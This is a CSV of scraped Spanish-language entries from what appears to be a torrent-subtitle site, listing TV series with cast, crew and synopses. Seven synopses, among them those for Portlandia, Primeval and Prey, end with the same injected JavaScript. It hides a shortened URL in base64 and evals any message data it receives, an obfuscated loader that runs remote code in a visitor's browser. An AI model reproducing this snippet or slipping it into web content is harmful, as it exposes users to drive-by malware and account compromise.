Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/paranoid/,Paranoid,"
                       Título original: Paranoid
Año: 2016
Duración: 360 min.
País: Reino Unido
Director: Bill Gallagher (Creator), Mark Tonderai, Kenneth Glenaan
Guión: Bill Gallagher
Música: Ben Onono
Fotografía: Dirk Nel, Sean Van Hales
Productora: Red Production Company
Género: Thriller. Drama. Crimen

Capítulos: 8


Reparto:

Indira Varma ... Nina Suresh
Robert Glenister ... Bobby Day
Neil Stuke ... Michael Niles
Lesley Sharp ... Lucy Cannonbury
Dominik Tiefenthaler ... Walti Merian
Polly Walker ... Monica Wayfield						","
Descripcion
Situado en Cheshire, en la pequeña ciudad ficticia de Marshwell, Angela Benton es asesinada en un parque infantil con multitud de testigos. Los detectives Michael Niles, Nina Suresh, Alec Wayfield (Dino Fetscher) y Bobby Day se encargan de esta investigación, a priori muy sencilla, y no tardan en darse cuenta de que todo es más complejo de lo que parece. 
Lo que se sabe del caso es que Angela Benton estaba en el parque con Luke, su hijo de tres años al que había ido a recoger al colegio. Entonces se suceden una serie de sonidos extraños y ella aparece brutalmente apuñalada.  A medida que los detectives van profundizando en el caso, van siendo arrastrados a un misterioso viaje que les llevará por todo Europa.
"
https://www.subtorrents1.com/series/once-upon-a-time-in-wonderland/,Once Upon a Time in Wonderland,"
                       Título original: Once Upon a Time in Wonderland
Año: 2013 
País: Estados Unidos
Director: Adam Horowitz (Creator),  Edward Kitsis (Creator)
Guión: Adam Horowitz, Edward Kitsis (Novela: Lewis Carroll)
Productora: ABC Studios / ABC Television Network
Género: Fantástico. Drama. Romance. Intriga | Cuentos. Spin-off 
Temporada: 1
Capítulos : 13

Reparto:
Sophie Lowe,  
Michael Socha,  
John Lithgow,  
Peter Gadiot,  
Jonny Coyne,  
Paul Reubens,  
Emma Rigby

","
Descripcion
Seguirá a Alice (Sophie Lowe), quien cuenta la historia de cómo hay una tierra extraña al otro lado de una madriguera de conejo. Todo el mundo piensa que está loca y los médicos no paran de hacer terapia para que lo olvide todo. Pero pronto llegarán de nuevo la Sota de Corazones (Michael Socha) y el Conejo Blanco (John Lithgow) que la trasladarán de nuevo al País de las Maravillas.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/nos4a2/,NOS4A2,"
                       Título original
NOS4A2 (TV Series)
Año
2019
Duración
60 min.
País
Estados Unidos Estados Unidos
Dirección
Kari Skogland
Guion
Jami O'Brien (Novela: Joe Hill)
Fotografía
Martin Ahlgren
Reparto
Ebon Moss-Bachrach,  Zachary Quinto,  Ashleigh Cummings,  Darby Camp, Rarmian Newton,  Asher Miles Fallica,  Dalton Harrod,  Chris McKinney, Rob Lévesque,  Owen Burke,  Morgan Lindholm,  Larry Mitchell,  Gisela Chipe, Kayla Caulfield,  Steven Howitt,  Michael Maize,  Ólafur Darri Ólafsson, Jose Guns Alves,  Nancy De Mayo,  Danny Deferrari,  Kayla Harrity,  Renee Lawrie, Louise Mara,  Lisa Miranda,  Joseph Oliveira,  William Ragsdale,  Sean Rogers, Lexie Roth,  Skyler Wright
Productora
AMC Studios / Tornante Company. Distribuida por AMC
Género
Serie de TV. Terror						","
Descripcion
Una joven Victoria ""Vic"" McQueen descubre que tiene el poder de abrir portales que la ayuden a encontrar sus objetos perdidos. A medida que indaga más en este ""mundo oculto"", Vic descubre a una serie de aventureros que también pululan por él, algunos buenos y benévolos, otros totalmente corrompidos por el poder. El caso más flagrante es el de ""Charlie Manx"", un inmortal que dice haber adquirido la vida eterna alimentándose con las almas de los niños a los que da caza, por lo que se convierte automáticamente en el peor enemigo de Vic.
"
https://www.subtorrents1.com/series/project-blue-book/,Project Blue Book,"
                       Título original
Project Blue Book (TV Series)
Año
2019
País
Estados Unidos Estados Unidos
Dirección
Robert Stromberg
Guion
Emily Brochin, Sean Jablonski, David O'Leary, Harley Peyton, Thania St. John, Stewart Kaye, Aaron Rapke
Música
Daniel Wohl
Fotografía
C. Kim Miles, Ken Krawczyk
Reparto
Aidan Gillen,  Michael Malarkey,  Laura Mennell,  Ksenia Solo,  Michael Harney, Neal McDonough,  Jill Morrison,  Heather Doerksen,  Francesca Bianchi,  Chad Rook, Esabella Anna Karena Strickland,  Tony Alcantar,  Adam Beauchesne,  Matt Bellefleur, Stephanie Bennett,  Mary Black,  Andrea Brooks,  Rohan Campbell,  David Coakley, Patrick Gallagher,  Malcolm Goodwin,  Sebastian Greaves,  Joshua Hinkson, Jesse Irving,  Khalilah Joi,  Trevor Lerner,  Jake Manley,  Darren Mann,  Craig March, Don McLeod,  Michael Meneer,  Annette Reilly
Productora
A+E Studios / Compari Entertainment / History Channel / ImageMovers. Distribuida por History Channel
Género
Serie de TV. Intriga | Basado en hechos reales						","
Descripcion
Sinopsis
J. Allen Hynek es un brillante profesor de universidad que es recrutado por las Fuerzas Especiales Aéreas de los Estados Unidos para investigar una serie de casos que no se resolvieron en su momento. Hynek tiene que hacer frente a la difícil tarea de recabar información para tratar de arrojar algo de luz a una de las eras más misteriosas de la historia del país norteamericano.
"
https://www.subtorrents1.com/series/portlandia/,Portlandia,"
                       FICHA TÉCNICA

Idioma: Ingles.
Subtítulos: Español (aparte).
Calidad: HDTV.
Formato de Audio: MP3.
Source: IFC
Genre: Comedia
Season: 2
ViDEO: XviD at 960 kbps
AUDiO: VBR MP3 ~128kbps 2ch 48khz
ASPECT RATiO: 16:9
RESOLUTiON: 624x352
FRAME RATE: 25 fps 						","
Descripcion
Serie de TV (2011-Actualidad). Portlandia es una nueva serie de televisión que nos habla del sueño de los años 90. Tiene lugar en Portland (Oregón). Un sitio al que no va la gente cuando se jubila, un sitio en dónde a los tatuajes no se les va el color, las tías buenas llevan gafas y los coches no existen, la gente se mueve de un sitio a otro en bicicleta, en monociclo o en monopatín.
Reparto
Fred Armisen, Carrie Brownstein(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/quantico/,Quantico,"
                       Título original: Quantico
Año: 2015
País: Estados Unidos
Director: Marc Munden
Guión: Joshua Safran
Música: Joel J. Richard
Fotografía: Todd McMullen
Productora: ABC
Género: Drama, Policíaco

Capítulos: 19


Reparto:

Priyanka Chopra ... Alex Parrish
Jake McLaughlin ... Ryan Booth
Aunjanue Ellis ... Miranda Shaw
Yasmine Elmasri ... Nimah Amin
Johanna E. Braddy ... Shelby Wyatt
Tate Ellington ... Simon Asher
Graham Rogers ... Caleb Haas
Josh Hopkins ... Special Agent Liam O'Connor						","
Descripcion
Quantico es una serie de ABC que trata el tema del terrorismo silencioso. La ficción se centra en un grupo de jóvenes reclutas del FBI, todos ellos con un motivo importante para unirse, que luchan , a su manera, a través de la base de Quantico, en Virginia.
La serie alterna el pasado oculto de los reclutas con su formación en la academia del FBI y la evolución que los personajes sufren hacia el futuro. Así, se podrá conocer a todos los personajes, ya que uno de ellos guarda el secreto más temido: es un terrorista durmiente que formará parte del atentado más devastador que sufra Estados Unidos desde el 11 de septiembre.
 
"
https://www.subtorrents1.com/series/partners-2014/,Partners (2014),"
                       Título original: Partners
Año: 2014
País: Estados Unidos
Director: Richard Correll,  Steve Zuckerman,  Kelsey Grammer
Guión: Robert Horn, Allan Rice, Robert L. Boyett, Larry Mintz, David A. Arnold, David Love
Fotografía: Gregg Heschong
Productora: Debmar-Mercury / Lionsgate Televisión
Género: Comedia | Policíaco. Buddy Films


Reparto: 


Adrienne Wilkinson ... Heather
Aisha Kabia ... Angela
Cecelia Specht ... Elaine Davenport
Danièle Watts ... Laura Jackson
Joy Jacobson ... Emeline
Kelsey Grammer ... Allen Braddock
Kimberly Fox ... Halle
Martin Lawrence ... Marcus Jackson
McKaley Miller ... Lizzie Braddock
Renee Percy ... Mindy 

","
Descripcion
Kelsey Grammer y Martin Lawrence como unos abogados de Chicago de orígenes muy diferentes que desarrollan una sociedad después de que se conozcan de forma inesperada en el tribunal en el peor día de sus vidas.
Temporada: 1
Capítulo: 10(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/pioneer-one/,Pioneer One,"
                       TÍTULO ORIGINAL: Pioneer One
AÑO: 2010 	
PAÍS: Estados Unidos 	 
DIRECTOR: Josh Bernhard (Creator), Bracey Smith (Creator)
GUIÓN: Josh Bernhard, Bracey Smith
REPARTO:
James Rich, Alexandra Blatt
PRODUCTORA: VODO network
GÉNERO:  Serie de TV. Ciencia ficción. Intriga. Drama | Serie Online
","
Descripcion
SINOPSIS: 
7 episodios. 'Pioneer One' es una serie creada por Josh Bernhard y Bracey Smith y protagonizada por James Rich y Alexandra Blatt. El departamento de Seguridad Nacional investiga un brote de envenenamiento por radiación surgido en varias ciudades de EEUU. Lo que parece en un principio un ataque terrorista pronto resultará ser un objeto caído del cielo en cuyo interior hay una persona, enfundada en un traje de cosmonauta ruso que afirmará haber nacido en Marte. Ambiciosa serie online producida con las donaciones de los fans de la misma, y emitida gratuitamente a través de Internet.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/powers/,Powers,"
                       Título original: Powers
Año: 2015
País: Estados Unidos
Director: David Slade, David Petrarca, Bill Eagles, Tim Hunter, Aaron Lipstadt
Guión: Remi Aubuchon, Brian Bendis, Allison Moore, Julie Siege
Música: Jeff Rona
Fotografía: John Lynch
Productora: Circle of Confusion, Sony Pictures Television, FX Productions
Género: Ciencia ficción, Drama, Policíaco, Crimen, Superhéroes, Cómic

Capítulos: 10


Reparto:

Sharlto Copley ... Christian Walker
Susan Heyward ... Deena Pilgrim
Noah Taylor ... Johnny Royalle
Olesya Rulin ... Calista Secor
Adam Godley ... Captain Cross
Max Fowler ... Krispin Stockley
Michelle Forbes ... Retro Girl
Eddie Izzard ... Wolfe						","
Descripcion
La historia transcurre en un universo paralelo: en la gran ciudad donde se ambienta Powers habitan todo tipo de superhéroes y supervillanos, y sus peleas son una parte más del ajetreado ritmo diario de la ciudad. El veterano detective de homicidios Christian Walker es el encargado de ocuparse de los casos que están relacionados con poderes, con la ayuda de su novata y joven compañera recién asignada, Deena Pilgrim. Pero el trabajo de un policía en un mundo habitado por seres con poderes es distinto, diferentes armas y sobre todo diferente manera de pensar, ellos necesitan un tipo especial de policía para poder encargarse de ese trabajo.
"
https://www.subtorrents1.com/series/pearson/,Pearson,"
                       Título original
Pearson (TV Series)
Año
2019
Duración
60 min.
País
Estados Unidos Estados Unidos
Dirección
Daniel Arkin (Creator),  Aaron Korsh (Creator),  Kevin Bray,  Emile Levisetti, Alexis Ostrander,  Mark Polish,  Salli Richardson-Whitfield,  Stefan Schwartz, Silver Tree
Guion
Daniel Arkin, Aaron Korsh, Jameal Turner, Chris Downey, Lauren Herstik, Sonay Hoffman, Sylvia L. Jones
Fotografía
Cort Fey
Reparto
Gina Torres,  Isabel Arraiza,  Eli Goree,  Simon Kassianides,  Bethany Joy Lenz, Chantel Riley,  Morgan Spector,  Wayne Duvall,  Jonny Berryman,  Ethan Ireland, Danni Lang,  Kannon Hicks,  Brandon Young,  Coier Amerson,  Bertila Damas, Michael Dearie,  Sam Manual,  Carly Nykanen,  Celeste Pechous,  Ivan Shaw, Julian Acosta,  Lynn Andrews,  Beto Angulo,  Michael Andrew Baker,  Kenny Barr, Paul Bartholomew,  Crystal Porter Bazemore,  Jacob Berger,  Alex Brown, Caroline Choi,  Cameron DeVictor,  Cherish Monique Duke,  Paul Edney, Ethan Flower,  Stephen Friedrich,  Rula Sirhan Gardenier,  Desiree Hall, Andrew Hamrick,  Maahra Hill,  Ann Hu,  Rich Ceraulo,  Steven Koller,  Javier Lezama, Diandra Lyle,  Alyssa Mann,  Susan Ortiz,  John Posey,  Carlos Pratts,  Carlos Ragas, Robert Riechel Jr.,  Gracy Samuel,  Amol Shah,  Pia Shah,  Chip Sickler, Markus Silbiger,  Ray Stoney,  Alfredo Tavares,  Paul Robert Williams III, Francisco M. Martinez
Productora
Universal Cable Productions. Distribuida por USA Network
Género
Serie de TV. Drama						","
Descripcion
Sinopsis
10 episodios. La abogada Jessica Pearson se adentra en el complejo y sórdido mundo de la política de Chicago.
"
https://www.subtorrents1.com/series/queer-britain/,Queer Britain,"
                       Pais Inglaterra
Año 2017
Idioma Ingles
Subtitulos Español						","
Descripcion
Presentado por YouTuber y el periodista Riyadh Khalaf, Queer Britain se pone bajo la piel de la cultura queer y brilla una luz sobre los desafíos que enfrenta la comunidad LGBTQ
"
https://www.subtorrents1.com/series/played/,Played,"
                       Played
Classification: Scripted
Genre: Action | Crime | Drama | Family
Status: New Series
Network: CTV ( Canada)
Airs: Thursdays at 10:00 pm
Runtime: 60 Minutes
Premiere: October 03, 2013
Episode Order: 13

Cast:

Adam Butcher ... Jesse Calvert
Agam Darshi ... Khali Bhatt
Chandra West ... Rebecca Ellis
Dwain Murphy ... Daniel Price
Lisa Marcos ... Maria Cortez
Vincent Walsh ... Detective John Moreland
","
Descripcion
Played. Serie policial canadiense basada en los casos del CIU (Unidad de Investigaciones Covert). Cada semana un nuevo caso. La unidad prepara la operación y ejecuta cada caso encubierto mientras se infiltran en mundos criminales, reuniendo pruebas y realizando arrestos. Los detectives encubiertos CIU construyen relaciones con lel mundo de la delincuencia.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/power/,Power,"
                       Título Original: Power
Creador: Courtney Kemp Agboh
Producción Ejecutiva: Courtney Kemp Agboh, Curtis Jackson, Mark Canton y Randall Emmett
Estudio: CBS Television Studios
Género: Drama
Fecha de estreno: 7 de junio de 2014
Distribución: Paramount
Horario de emisión: Sábado 9.00 p.m.

Temporada: 1ª
Episodios: 8

Reparto:
Omari Hardwick ... James ""Ghost"" St. Patrick
Naturi Naughton ... Tasha St. Patrick
Joseph Sikora ... Tommy Egan
Lela Loren ... Angela Valdes
Curtis ""50 Cent"" Jackson ... Kanan
Adam Huss ... Josh Kantos
Lucy Walters ... Holly						","
Descripcion
De la mano del rapero Curtis ""50 Cent"" Jackson y Courtney Kemp Agboh (The Good Wife) llega Power, una serie de corte criminal ambientada en dos mundos muy diferentes: la glamurosa escena nocturna de los clubs de Nueva York y el brutal negocio de la droga. Todo reunido en torno a un hombre, James ""Ghost"" St. Patrick (Omari Hardwick, Saved), un joven que lo tiene todo: una atractiva esposa, un fabuloso ático en Manhattan y uno de los nightclub de moda en Nueva York. Su local, llamado Truth, atrae a la élite social de la ciudad, a los hombres y mujeres famosos o infames que controlan la ciudad que nunca duerme.
Al tiempo que va creciendo el éxito de su negocio, Ghost planea ampliar sus expectativas y situar su club entre los más rentables del país. Sin embargo, Truth esconde una terrible realidad tras su paredes. Es la tapadera para las actividades ilícitas de Ghost, un lucrativo cártel del narcotráfico que sirve a los más ricos y poderosos de la ciudad. Él es uno de los mayores distribuidores de droga de Nueva York. Junto con su mejor amigo, Tommy Egan (Joseph Sikora, True Detective), un joven tremendamente leal, ha creado su imperio de la droga desde cero y para él, Ghost y este negocio, lo es todo. No dejará que nada se interponga entre ellos.
"
https://www.subtorrents1.com/series/pretty-little-liars-the-perfectionists/,Pretty Little Liars The Perfectionists,"
                       Título original
Pretty Little Liars: The Perfectionists (TV Series)
Año
2019
Duración
45 min.
País
Estados Unidos Estados Unidos
Dirección
I. Marlene King (Creator),  Elizabeth Allen Rosenbaum,  Norman Buckley, Shiri Appleby
Guion
I. Marlene King, Sara Shepard
Música
Michael Suby
Fotografía
Larry Reibman
Reparto
Eli Brown,  Sofia Carson,  Hayley Erin,  Graeme Thomas King,  Chris Mason, Sydney Park,  Janel Parrish,  Sasha Pieterse,  Kelly Rutherford,  Evan Bittencourt, Jacques Colimon,  Noah Gray-Cabey,  Kassidy Matthews,  Kyle S. Parsons, Garrett Wareing,  Phillip Rhys,  Nick Cassidy,  Maureen Andronis,  Timothy A. Bennett, Mike Brakefield,  David Chattam,  Chad Copeland,  Analesa Fisher,  Emir García, Max Huskins,  Shann Ihde,  K'Linh Nguyen,  Mirela Sabeva,  James Scorzelli, Sarah Siadat,  Daniel Vasic,  Ashley Melissa Wright,  John Zoller,  Kory Abreu, Peter James DeLuca,  Dana Millican
Productora
Warner Horizon Television. Distribuida por Freeform
Género
Serie de TV. Intriga. Drama | Crimen						","
Descripcion
Sinopsis
10 episodios. Un grupo de tres estudiantes universitarias que han logrado prácticamente todo lo que deseaban en la vida lucha para sobrevivir al estrés que conlleva vivir en un pueblo aparentemente perfecto. Su mundo cambia repentinamente cuando tiene lugar un misterioso asesinato que saca a relucir el auténtico espíritu de sus habitantes.
"
https://www.subtorrents1.com/series/primeval/,Primeval,"
                       Título Original: Primeval 
Género: Ciencia Ficción 
Temporada: 3 
Creador: Tim Haines, Adrian Hodges 
Producción ejecutiva: Cameron McAllister, Tim Haines 
Estudio: Impossible Pictures 

Douglas Henshall ..... Profesor Nick Cutter
Lucy Brown ........... Claudia Brown/Jennyfer Lewis
Hannah Spearritt ..... Abby Maitland
Andrew Lee Potts ..... Connor Temple
Ben Miller ........... James Lester
","
Descripcion
Unas inexplicables anomalías están abriendo agujeros en la barrera del tiempo, permitiendo a las criaturas más salvajes de la evolución -del pasado y del futuro- vagar por el mundo actual. Algunas son feroces, otras simpáticas y todas ellas extrañas, además de tener algo más en común: éste no es su sitio. ¿Sobrevivirá la humanidad a esta nueva amenaza?
(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/quacks/,Quacks,"
                       Creada y escrita por James Wood (Rev), Quacks estará protagonizada por Mathew Baynton (The Wrong Mans), Rory Kinnear (Skyfall), Tom Basden (Plebs) y Lydia Leonard (Life in squares). Rupert Everett participará de manera especial.
Co-producción entre BBC y Family Tree (productora de HBO)						","
Descripcion
La historia tiene lugar en un momento en que la ciencia médica como la conocemos todavía estaba en su infancia; cuando los médicos tuvieron las mismas probabilidades de matar a sus pacientes como curarlos; y cuando experimentaban com sí mismos y entre sí. Kinnear jugará uno de esos hombres , un cirujano arrogante; Baynton será un psiquiatra en ciernes; Basden será un dentista hedonista que se convierte enanestesista; y Leonard como un activista social, testarudo.
"
https://www.subtorrents1.com/series/queens-of-mystery/,Queens Of Mystery,"
                       Titulo Original: Queens of Mystery 
Titulo Español: Queens of Mystery 
Año: 2019 
Genero: Comedia 
Promedio De Duracion: 45 Minutos 
Pais: UK
Clasificacion: Mayores de 12 Años 						","
Descripcion
QUEENS OF MYSTERY sigue las entretenidas aventuras de Beth, Cat y Jane Stone, tres hermanas que escriben el crimen y su sobrina de 28 años, la sargento detective Matilda Stone. Usando su extenso conocimiento del crimen, tanto real como ficticio, resuelven los asesinatos en el pintoresco pueblo inglés de Wildemarsh. Pero no importa cuántas cajas puedan romper, el misterio sin resolver que les persigue a todos es el de la desaparición de la madre de Matilda. Entre la investigación de los asesinatos de los curiosos a los extraños y la escritura de sus propias novelas, las tres tías también buscan ayudar a su sobrina, siempre soltera, a encontrar el amor.
"
https://www.subtorrents1.com/series/prison-break/,Prison Break,"
","
Descripcion
"
https://www.subtorrents1.com/series/prey-miniserie/,Prey (Miniserie),"
                       Título Original: Prey
Director: Nick Murphy 
Creador: Chris Lunt. 
Producción ejecutiva: Tom Sherry. 
Estudio: ITV. 
Capítulos: 3. 
Género: Thriller 
Duración: 60 Minutos

Reparto:

Adrian Edmondson ... Assistant Chief Constable Warner
Anastasia Hille ... Detective Chief Inspector Andrea MacGregor
Benedict Wong ... Detective Sergeant Ash Chan
Charlie Concannon ... Max Farrow
Craig Parkinson ... Detective Inspector Sean Devlin
Ezra Dent Watson ... Finn Farrow
Heather Peace ... Abi Farrow
John Simm ... Detective Sergeant Marcus Farrow
Rosie Cavaliero ... Chief Inspector Susan Reinhardt 						","
Descripcion
Prey cuenta la historia de un hombre a la fuga, desesperado por limpiar su nombre por el bien de su familia. Cuando el Detective de policía Marcus Farrow (John Simm), un policía muy querido con una esposa y dos hijos, es encontrado en la escena de un crimen brutal su mundo empieza a derrumbarse. Arrestado y acusado, al parecer el destino de Farrow está sellado. Así que cuando llegua la oportunidad de escapar y limpiar su nombre, él la agarra con ambas manos.
(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/people-of-earth/,People Of Earth,"

Título original
    People of Earth (TV Series) 
Año
    2016
Duración
    30 min.
País
    Estados Unidos Estados Unidos
Director
    Ian Fitzgibbon, Shaka King, Greg Daniels, Rodman Flender, Andrew Gaynord, Jennifer Celotta 
Guion
    David Jenkins, Charla Lauriston, Brigitte Liebowitz, Alyssa Lane, Alex J. Sherman, Nick Adams, Emily Heller, Norm Hiscock, Samantha McIntyre
Música
    Mark Mothersbaugh
Fotografía
    Jonathon Cliff, Miroslaw Baszak
Reparto
    Michael Cassidy, Wyatt Cenac, Ana Gasteyer, Brian Huskey, Luka Jones, Debra McCabe, Tracee Chimo, Chris Gleason, Björn Gustafsson, Ken Hall, Okiki Kendall, Nancy Lenehan, Drew Nelson, Oscar Nuñez, Da'Vine Joy Randolph, Daniel Stewart Sherman 
Productora
    Conaco / Warner Horizon Television
Género
    Serie de TV. Comedia. Intriga. Ciencia ficción 						","
Descripcion
Con una primera temporada que cuenta con diez episodios, esta serie sigue la historia del periodista Wyatt Jones (interpretado por Wyatt Cenac), quien se muestra escéptico ante las afirmaciones que hace un grupo de personas de haber sido abducidos por criaturas alienígenas.
Sin embargo, después de investigar a un grupo de apoyo formado por gente que ha sido secuestrada por seres de otro planeta va descubriendo poco a poco que podría estar equivocado. Mientras más cosas nuevas aprende en el grupo, también queda más intrigado y confundido. Pero lo más peligroso está todavía por venir, cuando se vea seducido por todo lo que sabe.
"
https://www.subtorrents1.com/series/perpetual-grace-ltd/,Perpetual Grace LTD,"
                       Título original
Perpetual Grace, LTD (TV Series)
Año
2019
País
Estados Unidos Estados Unidos
Dirección
Steve Conrad,  Jim Whitaker
Guion
Steve Conrad, Stephen Hoey, Bruce Terris
Música
Alex Wurman
Fotografía
Nicole Hirsch Whitaker, Jim Whitaker
Reparto
Ben Kingsley,  Jimmi Simpson,  Jacki Weaver,  Dana DeLorenzo,  Damon Herriman, Dash Williams,  Luis Guzmán,  Eliana Alexander,  Michael Chernus,  Alonso Alvarez, Calvin Anthony Benuto,  Ivette Li-Sanchez,  Chris Conrad,  Cliff Gravel,  Cheo Tapia, J. Nathan Simmons,  LynNita Ellis,  Stephanie Hill,  Ervin Ross,  Manny Rubio, Bonita King,  Hana Mae Lee,  Terry O'Quinn,  Kurtwood Smith,  Sean Boyd, Jacob Browne,  Stephen Conn,  Nik Kash,  Sophia Del Pizzo,  Stephen R. Estler, Veronica Falcón,  Casey Graf,  David Hight,  Michael Slusher,  Johnny Visotcky
Productora
MGM Television. Distribuida por Epix / Metro-Goldwyn-Mayer
Género
Serie de TV. Drama						","
Descripcion
Sinopsis
Sigue los pasos de James, un estafador que pretende embaucar al Padre Byron Brown (Kingsley) sin sospechar que quizás es mucho más peligroso de lo que aparenta ser a primera vista.
"
https://www.subtorrents1.com/series/pulsaciones/,Pulsaciones,"
                       Título original
    Pulsaciones (TV Series)
Año
    2016
País
    España
Dirección
    Emilio Aragón, David Ulloa, David Victori
Guion
    Emilio Aragón, Francisco Roncal, Carmen Ortiz, Ángela Obón, Adriana Rivas, Ramón Tarrés, Juan María Ruiz Córdoba
Música
    Juan Carlos Cuello
Fotografía
    David Omedes
Reparto
    Pablo Derqui, Leonor Watling, Meritxell Calvo, Ingrid Rubio, Juan Diego Botto, Fernando Sansegundo, Javier Lara, Alberto Berzal, Antonio Gil, Manuel Dueso, Carolina Lapausa, Ana Marzoa, Juan Blanco, Aitor Merino, Nacho Marraco, Amparo Vega León, Cristina Marcos, María Mercado, Martin Aslan, Julia Lara, José Pedro Carrión, Rubén Fulgencio, Nicolás Gaude, Anna Gonzalvo, Álex Navarro, Carolina Clemente, Òscar Rabadán
Productora
    Globomedia
Género
    Serie de TV. Thriller | Thriller psicológico						","
Descripcion
Serie de TV (10 episodios). Narra la peligrosa investigación que llevará a cabo Álex (Pablo Derqui), un neurocirujano que se verá obligado a resolver las causas que rodean a la misteriosa muerte de un periodista de investigación, Rodrigo (Juan Diego Botto), cuyo corazón acabará salvando la vida del médico. El único punto de partida de Álex serán las pistas que, en forma de recuerdos y ensoñaciones, experimenta tras haberle sido trasplantado el nuevo órgano. En sus pesquisas, el neurocirujano estará acompañado por Lara, una joven periodista que pondrá todo su empeño en descubrir qué se esconde tras la muerte del que fue su mentor y amigo.
"
https://www.subtorrents1.com/series/proof/,Proof,"
                       Título original: Proof
Año: 2015
Duración: 42 min
País: Estados Unidos
Director: Rob Bragin (Creator)
Guión: Rob Bragin
Música: David Buckley
Fotografía: Bernard Couture, Thomas Kloss
Productora: TNT DRAMA
Género: Drama, Misterios médicos, Horror, Supernatural

Capítulos: 10


Reparto:

Jennifer Beals ... Dr. Carolyn Tyler
Annie Thurman ... Sophie Tyler
Callum Blue ... Peter Van Owen
Caroline Kaplan ... Janel Flynn
David Sutcliffe ... Dr. Len Barliss
Edi Gathegi ... Zed
Joe Morton ... Dr. Charles Russell
Matthew Modine ... Ivan Turing						","
Descripcion
Drama sobrenatural protagonizado por la Dra. Carolyn Tyler (Jennifer Beals) que se embarca en una odisea para intentar hallar si hay vida después de la muerte. Tyler es una mujer de ciencia, muy escéptica, que será desafiada por un excéntrico multimillonario a probar si hay un más allá. Poco a poco la firmeza de la doctora irá viéndose sacudida por la duda.
"
